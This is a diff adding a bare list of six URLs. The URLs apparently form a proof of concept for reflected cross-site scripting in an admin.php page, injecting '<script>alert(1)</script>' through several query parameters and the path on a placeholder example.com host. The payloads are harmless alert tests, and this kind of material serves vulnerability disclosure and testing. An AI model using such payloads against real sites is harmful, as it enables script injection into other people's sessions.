@@ -1,0 +1,7 @@
+
+http://www.example.com/admin/admin.php?func=1&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&amp;skin=classic
+http://www.example.com/admin/admin.php?func=0&amp;skin=1&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+http://www.example.com/admin/admin.php?func=0&amp;todo=1&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+http://www.example.com/admin/admin.php?func=0&amp;what=1&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&amp;who=Faculty
+http://www.example.com/admin/admin.php?func=0&amp;what=mail&amp;who=1&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+http://www.example.com/admin/admin.php/&gt;&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;
